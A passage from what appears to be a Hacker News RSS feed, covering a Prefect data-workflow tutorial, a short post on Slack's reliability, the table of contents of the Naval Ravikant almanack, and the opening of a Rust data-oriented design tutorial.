      "countriesAndTerritories" : "Afghanistan",<br>         "geoId" : "AF",<br>         "countryterritoryCode" : "AFG",<br>         "popData2019" : 38041757,<br>         "continentExp" : "Asia",<br>         "Cumulative_number_for_14_days_of_COVID-19_cases_per_100000" : "1.04884745"<br>      },<br>   ... many more records<br>  ]<br>}</span></pre><p id="6c95">The final output in CSV format is looking like this:</p><pre><span id="4f76">year_month,cases,deaths<br>2019_12,0,0<br>2020_01,5,0<br>2020_02,52,0<br>2020_03,61856,583<br>2020_04,97206,5705<br>2020_05,22363,2212<br>2020_06,12777,473<br>2020_07,14439,168<br>2020_08,33683,157</span></pre><p id="58ac">In Prefect a flow is defined in arbitrary Python code. Following you see how the functions are wired together to produce the DAG:</p><figure><div></div><figcaption>Flow definition</figcaption></figure><p id="8f4a">The context manager (<em>with</em> statement) for <em>Flow</em> is creating the space to wire tasks together. Such a task can be an arbitrary python function that is annotated with <em>@task </em>or is inherited from <em>Task</em>. Both of these <a href="https://docs.prefect.io/core/concepts/tasks.html#overview" rel="noopener">constructs</a> are from Prefect. A special kind of task is a <em>Parameter</em> which acts as inputs to your flow. In this case, it is a selection in which countries your interested in for analysis and how the AWS S3 bucket is named where you want to export your data. In the following example, we will go into detail how these task functions are built.</p><p id="bd89">Let’s start with the gathering of the data and the function <em>download_data</em>. This task is the most “heavy” task as it needs to download a comparable large chunk of data (around 25 MB) and we don’t want to repeat this over and over again e.g. when re-executing the flow. Out of this reason, there are some special Prefect settings set to store the result with a daily cache key.</p><figure><div></div><figcaption>Cachable task</figcaption></figure><p id="5fe7"><em>donwload_data</em> seems like an arbitrary Python function you would find in many data projects but it has the <em>@task </em>annotation so that Prefect knows that this is a unit of work to place in the DAG. Prefect is using <a href="https://docs.prefect.io/core/advanced_tutorials/dask-cluster.html" rel="noopener">Dask</a> as a framework to execute and distribute work which means that these tasks themselves can do also quite some heavy-lifting. You could also imagine doing the heavy work outside of Prefect like executing a SQL on the <a href="https://docs.prefect.io/api/latest/tasks/snowflake.html#snowflakequery" rel="noopener">data warehouse</a> or submitting a <a href="https://docs.prefect.io/api/latest/tasks/databricks.html#databrickssubmitrun" rel="noopener">Spark job</a> on an external Big Data cluster instead of passing this to Dask.</p><p id="fcc0">In this case, we want the data to be cached so we specify that we want to checkpoint the data and that we are going to use a <a href="https://docs.prefect.io/api/latest/engine/results.html#localresult" rel="noopener"><em>LocalResult</em></a> which stores the data on the local disk with <em>cloudpickle</em>. It is also possible to specify different serializers in case you want to cache it in <a href="https://docs.prefect.io/api/latest/engine/serializers.html#jsonserializer" rel="noopener">JSON</a> or your own format. The <em>target</em> is the cache key which should be used and in this case, uses some templating variables provided by Prefect. The resulting cached file on disk will be saved in the following format:</p><pre><span id="5714">download_data-2020-09-08</span></pre><p id="6591">In a more production-like setup, you can also use S3 to store the data and would therefore exchange <em>LocalResult</em> with <a href="https://docs.prefect.io/api/latest/engine/results.html#s3result" rel="noopener"><em>S3Result</em></a>. You can use any Python datatype that cloudpickle can serialize and instead of passing the real data, it is also an option to only forward references to data e.g. paths in S3.</p><p id="a439">The rest of the task functions are like the following:</p><figure><div></div><figcaption>Simple tasks &amp; pre-defined task</figcaption></figure><p id="e03d">If you know <a href="https://pandas.pydata.org/" rel="noopener">Pandas</a> this code probably looks very familiar. The only important part here is that all the unique functions are having the <em>@task </em>decorator.</p><p id="2b60">The thing unique here is <em>upload_to_s3</em> as it is not using these decorators but a pre-defined task from the Prefect <a href="https://docs.prefect.io/core/task_library/" rel="noopener">task library</a> called <em>S3Upload</em> which allows uploading data to an S3 bucket. There are many other pre-defined tasks e.g. for submitting a Databricks job, dbt job, or executing an AWS Lambda function. It is also possible to write your own reusable and generic tasks. We were doing this in the past for a task submission to AWS ECS Fargate to do the heavy-lifting like machine learning externally from Prefect/Dask.</p><p id="780d">If you want to run this flow you can run it with <strong>Prefect Core </strong>locally on your computer or with <strong>Prefect Cloud</strong> to have a nice UI for your flow and inspect logs and task failures much nicer. In this example project, I showcase the two different options. In both cases, my flow is executed locally but in the later case, it also registered in the UI of Prefect Cloud. The annotations on the functions are not needed and in this case coming from the <a href="https://click.palletsprojects.com/en/7.x/" rel="noopener">click framework</a> to allow to easily build a nice CLI for your Python applications.</p><figure><div></div><figcaption>Two methods of executing flows</figcaption></figure><p id="53b7">I will go into details about deployment and how your flows are run in the next section.</p><p id="d04d">After running this flow a CSV file with the results should be visible in the specified S3 bucket:</p><pre><span id="a43a">aws s3 ls s3://ludwigm-bucket<br>2020-09-08 16:57:05        187 covid-monthly-2020-09-08T16:57:00.282974.csv<br>2020-09-08 18:03:31        187 covid-monthly-2020-09-08T18:03:26.231616.csv</span></pre></div></div></section><section><div><div><p id="bd9e">To get a better understanding of the different moving parts I will go into more detail on how you would deploy such flows with Prefect Cloud.</p><p id="d133">If you check out the repository for this blog article you can register the flow in Prefect cloud and run it with a local in-process agent like in the following code snippet. I use <a href="https://python-poetry.org/" rel="noopener">poetry</a> as Python package manager as an alternative to pip.</p><pre><span id="f757">poetry install<br>prefect auth login -t &lt;personal-access-token&gt;<br>export PREFECT__CLOUD__AGENT__AUTH_TOKEN=&lt;runner-token&gt;<br>export PREFECT__FLOWS__CHECKPOINTING=true<br>poetry run demo-flow run-with-cloud --bucket &lt;s3-bucket&gt;</span></pre><p id="6f15">Keep in mind to setup some things in Prefect Cloud beforehand to make this work:</p><ul><li id="33a4"><strong>Project:</strong> Home → Team → Projects → Add project (“Demo”)</li><li id="d57c"><strong>Agent runner token:</strong> Home → Team → API tokens → Create token (“RUNNER”)</li><li id="32eb"><strong>Personal access token:</strong> Home → User → Personal Access token -&gt; Create token</li></ul><p id="4296">What is noteworthy is that your flow is monitored and displayed in the UI but it is still running locally on your computer (<a href="https://docs.prefect.io/api/latest/agent/local.html#localagent" rel="noopener"><em>LocalAgent</em></a>). This is the <a href="https://medium.com/the-prefect-blog/the-prefect-hybrid-model-1b70c7fd296" rel="noopener">hybrid execution model</a> of Prefect which means that you potentially can use their cloud offering but the real execution is happening securely in your own infrastructure without your data being transferred to the Prefect cloud. How this would look like from an architecture standpoint can be seen in the next picture. For a more production-like setup, your flows are usually <a href="https://docs.prefect.io/orchestration/recipes/configuring_storage.html" rel="noopener">dockerized</a> and loaded from a private docker registry like AWS ECR and executed for example with the <a href="https://docs.prefect.io/api/latest/agent/fargate.html#fargateagent" rel="noopener"><em>FargateAgent</em></a>. Other options like loading flows from GitHub or S3 are also possible.</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2310/1*94GyNwN0HYXf8SjHJLCDFQ.png" width="1155" height="577" srcset="https://miro.medium.com/max/552/1*94GyNwN0HYXf8SjHJLCDFQ.png 276w, https://miro.medium.com/max/1104/1*94GyNwN0HYXf8SjHJLCDFQ.png 552w, https://miro.medium.com/max/1280/1*94GyNwN0HYXf8SjHJLCDFQ.png 640w, https://miro.medium.com/max/1400/1*94GyNwN0HYXf8SjHJLCDFQ.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*94GyNwN0HYXf8SjHJLCDFQ.png?q=20"></p></div></div></div><figcaption>Simplified architecture with multiple environments and hybrid execution model</figcaption></figure><p id="b6ad">In the following screenshots, you can see how this example flow looks like in the UI. You have possibilities to drill down in the DAG, run your flow with different input parameters, see a Gantt chart to see what executes when, and how parallel, or investigate task failures to see specific logs for that issue.</p></div></div><div><div><div><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3828/1*B2A_z9Ko5MKOveGnW1gLmg.png" width="1914" height="1085" srcset="https://miro.medium.com/max/552/1*B2A_z9Ko5MKOveGnW1gLmg.png 276w, https://miro.medium.com/max/1104/1*B2A_z9Ko5MKOveGnW1gLmg.png 552w, https://miro.medium.com/max/1280/1*B2A_z9Ko5MKOveGnW1gLmg.png 640w, https://miro.medium.com/max/1456/1*B2A_z9Ko5MKOveGnW1gLmg.png 728w, https://miro.medium.com/max/1632/1*B2A_z9Ko5MKOveGnW1gLmg.png 816w, https://miro.medium.com/max/1808/1*B2A_z9Ko5MKOveGnW1gLmg.png 904w, https://miro.medium.com/max/1984/1*B2A_z9Ko5MKOveGnW1gLmg.png 992w, https://miro.medium.com/max/2000/1*B2A_z9Ko5MKOveGnW1gLmg.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*B2A_z9Ko5MKOveGnW1gLmg.png?q=20"></p></div></div></div><figcaption>All Projects dashboard</figcaption></figure><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3836/1*ggwa529l0mytlzSYSZps0g.png" width="1918" height="1094" srcset="https://miro.medium.com/max/552/1*ggwa529l0mytlzSYSZps0g.png 276w, https://miro.medium.com/max/1104/1*ggwa529l0mytlzSYSZps0g.png 552w, https://miro.medium.com/max/1280/1*ggwa529l0mytlzSYSZps0g.png 640w, https://miro.medium.com/max/1456/1*ggwa529l0mytlzSYSZps0g.png 728w, https://miro.medium.com/max/1632/1*ggwa529l0mytlzSYSZps0g.png 816w, https://miro.medium.com/max/1808/1*ggwa529l0mytlzSYSZps0g.png 904w, https://miro.medium.com/max/1984/1*ggwa529l0mytlzSYSZps0g.png 992w, https://miro.medium.com/max/2000/1*ggwa529l0mytlzSYSZps0g.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*ggwa529l0mytlzSYSZps0g.png?q=20"></p></div></div></div><figcaption>Flow group overview</figcaption></figure><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3836/1*dSJ4YRQDwo9YU8eh2fKeFA.png" width="1918" height="1096" srcset="https://miro.medium.com/max/552/1*dSJ4YRQDwo9YU8eh2fKeFA.png 276w, https://miro.medium.com/max/1104/1*dSJ4YRQDwo9YU8eh2fKeFA.png 552w, https://miro.medium.com/max/1280/1*dSJ4YRQDwo9YU8eh2fKeFA.png 640w, https://miro.medium.com/max/1456/1*dSJ4YRQDwo9YU8eh2fKeFA.png 728w, https://miro.medium.com/max/1632/1*dSJ4YRQDwo9YU8eh2fKeFA.png 816w, https://miro.medium.com/max/1808/1*dSJ4YRQDwo9YU8eh2fKeFA.png 904w, https://miro.medium.com/max/1984/1*dSJ4YRQDwo9YU8eh2fKeFA.png 992w, https://miro.medium.com/max/2000/1*dSJ4YRQDwo9YU8eh2fKeFA.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*dSJ4YRQDwo9YU8eh2fKeFA.png?q=20"></p></div></div></div><figcaption>Flow schematic for DAG</figcaption></figure><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3836/1*4hoq6KBF1XcSXxJpFujmEg.png" width="1918" height="1096" srcset="https://miro.medium.com/max/552/1*4hoq6KBF1XcSXxJpFujmEg.png 276w, https://miro.medium.com/max/1104/1*4hoq6KBF1XcSXxJpFujmEg.png 552w, https://miro.medium.com/max/1280/1*4hoq6KBF1XcSXxJpFujmEg.png 640w, https://miro.medium.com/max/1456/1*4hoq6KBF1XcSXxJpFujmEg.png 728w, https://miro.medium.com/max/1632/1*4hoq6KBF1XcSXxJpFujmEg.png 816w, https://miro.medium.com/max/1808/1*4hoq6KBF1XcSXxJpFujmEg.png 904w, https://miro.medium.com/max/1984/1*4hoq6KBF1XcSXxJpFujmEg.png 992w, https://miro.medium.com/max/2000/1*4hoq6KBF1XcSXxJpFujmEg.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*4hoq6KBF1XcSXxJpFujmEg.png?q=20"></p></div></div></div><figcaption>Task detail view</figcaption></figure><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3832/1*jI18CsA16erreJUnU83Pxg.png" width="1916" height="1093" srcset="https://miro.medium.com/max/552/1*jI18CsA16erreJUnU83Pxg.png 276w, https://miro.medium.com/max/1104/1*jI18CsA16erreJUnU83Pxg.png 552w, https://miro.medium.com/max/1280/1*jI18CsA16erreJUnU83Pxg.png 640w, https://miro.medium.com/max/1456/1*jI18CsA16erreJUnU83Pxg.png 728w, https://miro.medium.com/max/1632/1*jI18CsA16erreJUnU83Pxg.png 816w, https://miro.medium.com/max/1808/1*jI18CsA16erreJUnU83Pxg.png 904w, https://miro.medium.com/max/1984/1*jI18CsA16erreJUnU83Pxg.png 992w, https://miro.medium.com/max/2000/1*jI18CsA16erreJUnU83Pxg.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*jI18CsA16erreJUnU83Pxg.png?q=20"></p></div></div></div><figcaption>Logs for a single task</figcaption></figure><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3836/1*1trZLAtqjm1H2ipPNJmBag.png" width="1918" height="1096" srcset="https://miro.medium.com/max/552/1*1trZLAtqjm1H2ipPNJmBag.png 276w, https://miro.medium.com/max/1104/1*1trZLAtqjm1H2ipPNJmBag.png 552w, https://miro.medium.com/max/1280/1*1trZLAtqjm1H2ipPNJmBag.png 640w, https://miro.medium.com/max/1456/1*1trZLAtqjm1H2ipPNJmBag.png 728w, https://miro.medium.com/max/1632/1*1trZLAtqjm1H2ipPNJmBag.png 816w, https://miro.medium.com/max/1808/1*1trZLAtqjm1H2ipPNJmBag.png 904w, https://miro.medium.com/max/1984/1*1trZLAtqjm1H2ipPNJmBag.png 992w, https://miro.medium.com/max/2000/1*1trZLAtqjm1H2ipPNJmBag.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*1trZLAtqjm1H2ipPNJmBag.png?q=20"></p></div></div></div><figcaption>Gantt visualization for timings</figcaption></figure></div></div></div><div><div><p id="c4ca">Other interesting things are the possibility to define <a href="https://docs.prefect.io/core/concepts/schedules.html#overview" rel="noopener">schedules</a> for your flow for periodic execution or the configuration of <a href="https://docs.prefect.io/orchestration/concepts/cloud_hooks.html#cloud-hooks" rel="noopener">CloudHooks</a> to enable e.g. an alerting for failed flows to Slack. Prefect also brings functionality to use and manages <a href="https://docs.prefect.io/core/concepts/secrets.html#secrets" rel="noopener">secrets</a> for your flow, e.g. for a database or API access.</p><p id="01d4">To make your flow run daily at a certain time it is as simple as adding the following code snippet to your flow creation.</p><pre><span id="231a">flow.schedule = CronSchedule("00 13 * * *")</span></pre></div></div></section></div>]]>
            </description>
            <link>https://makeitnew.io/prefect-a-modern-python-native-data-workflow-engine-7ece02ceb396</link>
            <guid isPermaLink="false">hacker-news-small-sites-24507710</guid>
            <pubDate>Thu, 17 Sep 2020 17:50:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Slacking Off?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24507679">thread link</a>) | @gbasin
<br/>
September 17, 2020 | https://garybasin.com/slacking-off/ | <a href="https://web.archive.org/web/*/https://garybasin.com/slacking-off/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-2061">
		<div>
		<!-- .entry-header -->

		<div>
			
<p>Ten years ago, a slick new chat app called Slack was announced. It was exactly what my startup needed at the time — a chat tool that didn’t suck.&nbsp;</p>



<p>Fast forward to today. Slack has essentially the same features. You send messages. You search channels. You communicate with your team. But not everything is like it used to be.</p>



<p>Sometimes, notifications don’t work. Other times, I’ll get stale indicators of unread messages. Occasionally, messages disappear when I use Slack on my phone.</p>



<p><strong>What happened? It doesn’t do anything differently, but now it works like shit.</strong></p>



<p>Building a software company and scaling it is… hard. It’s a struggle to keep your product working like it used to, especially if it gets bloated with complex features.</p>



<p>Make something scalable that solves a big problem. It should be simple, but it won’t be easy.</p>
					</div><!-- .entry-content -->

		<!-- .entry-meta -->
	</div>

	
</article></div>]]>
            </description>
            <link>https://garybasin.com/slacking-off/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24507679</guid>
            <pubDate>Thu, 17 Sep 2020 17:48:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Marker – open source hand-drawn illustrations]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 8 (<a href="https://news.ycombinator.com/item?id=24507433">thread link</a>) | @alokepillai
<br/>
September 17, 2020 | https://usepastel.com/marker-illustrations | <a href="https://web.archive.org/web/*/https://usepastel.com/marker-illustrations">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://usepastel.com/marker-illustrations</link>
            <guid isPermaLink="false">hacker-news-small-sites-24507433</guid>
            <pubDate>Thu, 17 Sep 2020 17:29:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Almanack of Naval Ravikant: A Guide to Wealth and Happiness (Free eBook)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24507281">thread link</a>) | @yarapavan
<br/>
September 17, 2020 | https://www.navalmanack.com/almanack-of-naval-ravikant/table-of-contents | <a href="https://web.archive.org/web/*/https://www.navalmanack.com/almanack-of-naval-ravikant/table-of-contents">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site">

      <div id="headerAnnouncementWrapper">
        <header id="header" role="banner">
          <a id="navToggle" data-controller="NavToggle">
            <svg viewBox="0 0 26 18">
              <use xlink:href="/assets/ui-icons.svg#hamburger-icon--even"></use>
            </svg>
          </a>

          <div>
          
            
              <div data-content-field="site-title"><p><a href="https://www.navalmanack.com/"><span>Almanack of Naval Ravikant</span> <span>|| A guide to wealth and happiness</span></a></p></div>
            
          
          </div>

          

          <div>
            <div>
              <!--
               
             --><a href="https://www.navalmanack.com/search" rel="search" data-controller="SearchToggle">
                <svg viewBox="0 0 20 20" shape-rendering="geometricPrecision">
                  <use xlink:href="/assets/ui-icons.svg#search-icon"></use>
                </svg>
                <svg viewBox="0 0 18 18">
                  <use xlink:href="/assets/ui-icons.svg#close-icon-line"></use>
                </svg>
               </a>
              </div><!--
              --><!--
              -->
          </div>
        </header>
      </div>

      <main id="page" role="main" data-content-field="main-content" data-controller="FadeInContent">

        <div data-content-field="main-content" data-item-id="5f581d48e81c0c5f1355fa26">
  
  <div>
    <p><time datetime="2020-09-17" pubdate="">
      <p><span>Sep </span><span>17</span>
      </p>
    </time></p><h2 data-content-field="title"><time datetime="2020-09-17" pubdate="">Sep 17 </time>TABLE OF CONTENTS</h2>

    <div>
      <div><p><a href="https://www.navalmanack.com/almanack-of-naval-ravikant?author=5d23ae6aedbe6a0001bcfd4c">Eric Jorgenson</a> </p></div><!--

      -->
    </div>
  </div>
  

  <div>
    <article id="article-5f581d48e81c0c5f1355fa26">
      
      
      <div data-controller="BlogProgressBar">
        
        <div id="pieWrapper">
          
          
          
          
        </div>
        <div><div data-layout-label="Post Body" data-type="item" data-updated-on="1599610592445" id="item-5f581d48e81c0c5f1355fa26"><div><div><div data-block-type="2" id="block-9641db619cdf777af32d"><div><h3><a href="https://www.navalmanack.com/almanack-of-naval-ravikant/important-notes-on-this-book-disclaimer">IMPORTANT NOTES ON THIS BOOK (DISCLAIMER)</a> <br><a href="https://www.navalmanack.com/almanack-of-naval-ravikant/foreword">FOREWORD </a><br><a href="https://www.navalmanack.com/almanack-of-naval-ravikant/erics-note-about-this-book">ERIC’S NOTE (ABOUT THIS BOOK) </a><br><a href="https://www.navalmanack.com/almanack-of-naval-ravikant/timeline-of-naval-ravikant">TIMELINE OF NAVAL RAVIKANT</a> <br><a href="https://www.navalmanack.com/almanack-of-naval-ravikant/now-here-is-naval-in-his-own-words">NOW, HERE IS NAVAL IN HIS OWN WORDS... </a></h3><h3><strong>PART I: WEALTH <br></strong>BUILDING WEALTH<br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/understanding-how-wealth-is-created">Understand How Wealth Is Created</a>  <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/find-and-build-specific-knowledge">Find and Build Specific Knowledge</a>  <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/play-long-term-games-with-long-term-people">Play Long-Term Games with Long-Term People</a> <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/take-on-accountability">Take on Accountability</a><br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/build-or-buy-equity-in-a-business">Build or Buy Equity in a Business</a> <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/find-a-position-of-leverage">Find a Position of Leverage</a> <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/get-paid-for-your-judgment">Get Paid for Your Judgment</a> <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/prioritize-and-focus">Prioritize and Focus</a> <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/find-work-that-feels-like-play">Find Work That Feels Like Play</a> <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/how-to-get-lucky">How to Get Lucky</a> <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/be-patient">Be Patient</a> <br>BUILDING JUDGMENT <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/judgment">Judgment</a> <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/how-to-think-clearly">How to Think Clearly</a> <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/shed-your-identity-to-see-reality">Shed Your Identity to See Reality</a> <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/learn-the-skills-of-decision-making">Learn the Skills of Decision-Making</a> <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/collect-mental-models">Collect Mental Models</a> <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/learn-to-love-to-read">Learn to Love to Read</a> 	 		 	 	 		</h3><h3><strong>PART II: HAPPINESS <br></strong>LEARNING HAPPINESS <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/happiness-is-learned">Happiness Is Learned</a> <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/happiness-is-a-choice">Happiness Is a Choice</a> <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/happiness-requires-presence">Happiness Requires Presence</a> <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/happiness-requires-peace">Happiness Requires Peace</a> <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/every-desire-is-a-chosen-unhappiness">Every Desire Is a Chosen Unhappiness</a> <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/success-does-not-earn-happiness">Success Does Not Earn Happiness</a> <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/envy-is-the-enemy-of-happiness">Envy Is the Enemy of Happiness</a> <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/happiness-is-built-by-habits">Happiness Is Built by Habits</a> <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/find-happiness-in-acceptance">Find Happiness in Acceptance</a><br> SAVING YOURSELF <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/choosing-to-be-yourself">Choosing to Be Yourself</a> <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/choosing-to-care-for-yourself">Choosing to Care for Yourself</a><br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/meditation-mental-strength">Meditation + Mental Strength</a> <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/choosing-to-build-yourself">Choosing to Build Yourself</a> <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/choosing-to-grow-yourself">Choosing to Grow Yourself</a> <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/choosing-to-free-yourself">Choosing to Free Yourself</a> <br>PHILOSOPHY <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/the-meanings-of-life">The Meanings of Life </a><br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/live-by-your-values">Live by Your Values</a><br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/rational-buddhism">Rational Buddhism</a> <br>          <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/the-present-is-all-we-have">The Present Is All We Have</a> </h3><h3><strong>BONUS<br></strong><a href="https://www.navalmanack.com/almanack-of-naval-ravikant/navals-recommended-reading">NAVAL’S RECOMMENDED READING <br></a>          Books <br>          Other Recommendations <br><a href="https://www.navalmanack.com/almanack-of-naval-ravikant/navals-writing">NAVAL’S WRITING</a> <br><a href="https://www.navalmanack.com/almanack-of-naval-ravikant/next-on-naval">NEXT ON NAVAL </a><br><a href="https://www.navalmanack.com/almanack-of-naval-ravikant/appreciation">APPRECIATION</a> <br><a href="https://www.navalmanack.com/almanack-of-naval-ravikant/sources">SOURCES </a><br><a href="https://www.navalmanack.com/almanack-of-naval-ravikant/about-the-author">ABOUT THE AUTHOR </a></h3></div></div></div></div></div></div>

        

        

        <section>
          <div>
            
          </div>
        </section>
      </div>
      

    </article>
  </div>



<section>
  <!--
  --><a href="https://www.navalmanack.com/almanack-of-naval-ravikant/foreword">
    
    <span>
      
      <h2><time datetime="2020-09-16" pubdate="">Sep 16 </time>FOREWORD</h2>
    </span>
  </a>
</section>



  
</div>

      </main>

      

    </div></div>]]>
            </description>
            <link>https://www.navalmanack.com/almanack-of-naval-ravikant/table-of-contents</link>
            <guid isPermaLink="false">hacker-news-small-sites-24507281</guid>
            <pubDate>Thu, 17 Sep 2020 17:17:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Introduction to Data Oriented Design with Rust]]>
            </title>
            <description>
<![CDATA[
Score 412 | Comments 156 (<a href="https://news.ycombinator.com/item?id=24506744">thread link</a>) | @headalgorithm
<br/>
September 17, 2020 | https://jamesmcm.github.io/blog/2020/07/25/intro-dod/ | <a href="https://web.archive.org/web/*/https://jamesmcm.github.io/blog/2020/07/25/intro-dod/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In the post we will investigate the main concepts of <a href="https://en.wikipedia.org/wiki/Data-oriented_design">Data-oriented
Design</a> using Rust.</p>

<p>The source code for this example is <a href="https://github.com/jamesmcm/data-oriented-example">available on Github</a>.</p>

<!--more-->

<h2 id="what-is-data-oriented-design">What is data-oriented design?</h2>

<p>Data-oriented design is an approach to optimising programs by carefully
considering the memory layout of data structures, and their implications
for auto-vectorisation and use of the CPU cache. I highly recommend
watching Mike Acton’s <a href="https://www.youtube.com/watch?v=rX0ItVEVjHc">“Data-Oriented Design and C++”</a> talk
if you haven’t seen it already.</p>

<p>In this post we will cover 4 cases, using <a href="https://docs.rs/criterion/0.3.3/criterion/">criterion</a> for
benchmarking. The cases are:</p>

<ul>
  <li>Struct of arrays vs. array of structs</li>
  <li>The cost of branching inside a hot loop</li>
  <li>Linked List vs. Vector iteration</li>
  <li>The cost of dynamic dispatch vs. monomorphisation</li>
</ul>

<h2 id="struct-of-arrays-vs-array-of-structs">Struct of Arrays vs. Array of Structs</h2>

<p>The <a href="https://en.wikipedia.org/wiki/AoS_and_SoA">Struct of Arrays vs. Array of Structs</a> 
refers to two contrasting ways of organising entity data to be operated
over.</p>

<p>For example, imagine we are writing a video game and we would like to
have a Player struct with the following fields:</p>

<div><div><pre><code><span>pub</span> <span>struct</span> <span>Player</span> <span>{</span>
    <span>name</span><span>:</span> <span>String</span><span>,</span>
    <span>health</span><span>:</span> <span>f64</span><span>,</span>
    <span>location</span><span>:</span> <span>(</span><span>f64</span><span>,</span> <span>f64</span><span>),</span>
    <span>velocity</span><span>:</span> <span>(</span><span>f64</span><span>,</span> <span>f64</span><span>),</span>
    <span>acceleration</span><span>:</span> <span>(</span><span>f64</span><span>,</span> <span>f64</span><span>),</span>
<span>}</span>
</code></pre></div></div>

<p>Then at each frame, we want to update the locations and velocities of all
Players. We could write something like:</p>

<div><div><pre><code><span>pub</span> <span>fn</span> <span>run_oop</span><span>(</span><span>players</span><span>:</span> <span>&amp;</span><span>mut</span> <span>Vec</span><span>&lt;</span><span>Player</span><span>&gt;</span><span>)</span> <span>{</span>
    <span>for</span> <span>player</span> <span>in</span> <span>players</span><span>.iter_mut</span><span>()</span> <span>{</span>
        <span>player</span><span>.location</span> <span>=</span> <span>(</span>
            <span>player</span><span>.location</span><span>.</span><span>0</span> <span>+</span> <span>player</span><span>.velocity</span><span>.</span><span>0</span><span>,</span>
            <span>player</span><span>.location</span><span>.</span><span>1</span> <span>+</span> <span>player</span><span>.velocity</span><span>.</span><span>1</span><span>,</span>
        <span>);</span>
        <span>player</span><span>.velocity</span> <span>=</span> <span>(</span>
            <span>player</span><span>.velocity</span><span>.</span><span>0</span> <span>+</span> <span>player</span><span>.acceleration</span><span>.</span><span>0</span><span>,</span>
            <span>player</span><span>.velocity</span><span>.</span><span>1</span> <span>+</span> <span>player</span><span>.acceleration</span><span>.</span><span>1</span><span>,</span>
        <span>);</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>This would be the usual object-oriented approach to this problem. The
issue here is that in memory the structs are stored as follows (assuming
no field re-ordering i.e. <code>#[repr(C)]</code>), on a 64-bit architecture each field will be 64
bits (8 bytes, so each Player is 64 bytes):</p>

<div><div><pre><code>-- Vec&lt;Player&gt;
name  (pointer to heap)  -- Player 1
health    
location0  (tuple split for clarity) 
location1
velocity0
velocity1
acceleration0
acceleration1
name  (pointer to heap)  -- Player 2
location0    
location1
velocity0
velocity1
acceleration0
acceleration1
...
</code></pre></div></div>

<p>Note the parts we want to operate on (locations, velocities and
accelerations) are not stored contiguously across different Players.
This prevents us from using vector operations to operate on multiple
players at once (since they cannot be loaded in the same CPU cache
line, usually ~64 bytes).</p>

<p>In contrast, the data-oriented approach is to design around this
limitation and optimise for auto-vectorisation. Instead of using a
struct per Player, we now use one struct for all Players and each Player
has their values stored at their index in the separate attribute Vectors:</p>

<div><div><pre><code><span>pub</span> <span>struct</span> <span>DOPlayers</span> <span>{</span>
    <span>names</span><span>:</span> <span>Vec</span><span>&lt;</span><span>String</span><span>&gt;</span><span>,</span>
